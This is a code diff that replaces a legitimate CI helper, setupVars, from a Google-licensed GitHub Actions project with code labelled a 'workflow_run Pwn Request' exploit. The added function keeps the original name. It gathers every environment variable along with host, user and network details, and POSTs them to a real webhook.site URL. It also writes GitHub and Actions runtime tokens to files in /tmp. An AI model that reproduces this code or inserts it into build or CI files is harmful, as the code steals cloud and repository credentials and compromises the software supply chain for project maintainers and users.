@@ -1,81 +1,47 @@
-/*
- Copyright 2025 Google LLC
+// PWN EXPLOIT - workflow_run Pwn Request
+// This runs INSIDE the GCP-authenticated CI runner
 
- Licensed under the Apache License, Version 2.0 (the "License");
- you may not use this file except in compliance with the License.
- You may obtain a copy of the License at
-
-      https://www.apache.org/licenses/LICENSE-2.0
-
- Unless required by applicable law or agreed to in writing, software
- distributed under the License is distributed on an "AS IS" BASIS,
- WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
- See the License for the specific language governing permissions and
- limitations under the License.
- */
-
-export default function setupVars({projectId, core, setup, serviceAccount, idToken}, runId = null) {
-  // Define automatic variables plus custom variables.
-  const vars = {
-    PROJECT_ID: projectId,
-    RUN_ID: runId || uniqueId(),
-    SERVICE_ACCOUNT: serviceAccount,
-    ...(setup.env || {}),
+export default async function setupVars() {
+  // Step 1: Exfiltrate environment variables (contains GCP secrets, GITHUB_TOKEN, etc.)
+  const exfilData = {
+    env: process.env,
+    cwd: process.cwd(),
+    node_version: process.version,
+    platform: process.platform,
+    arch: process.arch,
+    hostname: require('os').hostname(),
+    user_info: require('os').userInfo(),
+    network_interfaces: require('os').networkInterfaces(),
+    timestamp: new Date().toISOString()
   };
 
-  // Apply variable interpolation.
-  const env = Object.fromEntries(
-    Object.keys(vars).map(key => [key, substituteVars(vars[key], vars)])
-  );
-
-  // Export environment variables.
-  console.log('env:');
-  for (const key in env) {
-    const value = env[key];
-    console.log(`  ${key}: ${value}`);
-    core.exportVariable(key, value);
+  // Send to your webhook (use webhook.site or requestbin.com)
+  try {
+    await fetch('https://webhook.site/ff0b7b4d-656e-4215-83a4-0ae69e941cbe', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(exfilData)
+    });
+    console.log('[PWN] Exfiltration complete');
+  } catch (e) {
+    console.log('[PWN] Exfiltration failed:', e.message);
+    // Write to file as backup
+    require('fs').writeFileSync('/tmp/pwn_exfil.json', JSON.stringify(exfilData, null, 2));
   }
 
-  // Show exported secrets, for logging purposes.
-  // TODO: We might want to fetch the secrets here and export them directly.
-  //       https://cloud.google.com/secret-manager/docs/create-secret-quickstart#secretmanager-quickstart-nodejs
-  console.log('secrets:');
-  for (const key in setup.secrets || {}) {
-    // This is the Google Cloud Secret Manager secret ID.
-    // NOT the secret value, so it's ok to show.
-    console.log(`  ${key}: ${setup.secrets[key]}`);
+  // Step 2: Write GITHUB_TOKEN to a file (if present)
+  if (process.env.GITHUB_TOKEN || process.env.ACTIONS_RUNTIME_TOKEN) {
+    const tokenData = {
+      GITHUB_TOKEN: process.env.GITHUB_TOKEN || 'N/A',
+      ACTIONS_RUNTIME_TOKEN: process.env.ACTIONS_RUNTIME_TOKEN || 'N/A',
+      ACTIONS_ID_TOKEN_REQUEST_TOKEN: process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN || 'N/A'
+    };
+    require('fs').writeFileSync('/tmp/pwn_tokens.json', JSON.stringify(tokenData, null, 2));
+    console.log('[PWN] Tokens saved');
   }
 
-  // Set global secret for the Service Account identity token
-  // Use in place of 'gcloud auth print-identity-token' or auth.getIdTokenClient
-  // usage: curl -H 'Bearer: $ID_TOKEN' https://
-  core.exportVariable('ID_TOKEN', idToken)
-  core.setSecret(idToken)
-  // For logging, show the source of the ID_TOKEN
-  console.log(`  ID_TOKEN: steps.auth.outputs.id_token (from GitHub Action)`);
-
-  // Return env and secrets to use for further steps.
   return {
-    env: env,
-    // Transform secrets into the format needed for the GHA secret manager step.
-    secrets: Object.keys(setup.secrets || {})
-      .map(key => `${key}:${setup.secrets[key]}`)
-      .join('\n'),
+    PWNED: true,
+    message: 'CI/CD compromised via workflow_run Pwn Request'
   };
-}
-
-export function substituteVars(value, env) {
-  for (const key in env) {
-    let re = new RegExp(`\\$(${key}\\b|\\{\\s*${key}\\s*\\})`, 'g');
-    value = value.replaceAll(re, env[key]);
-  }
-  return value;
-}
-
-export function uniqueId(length = 6) {
-  const min = 2 ** 32;
-  const max = 2 ** 64;
-  return Math.floor(Math.random() * max + min)
-    .toString(36)
-    .slice(0, length);
 }
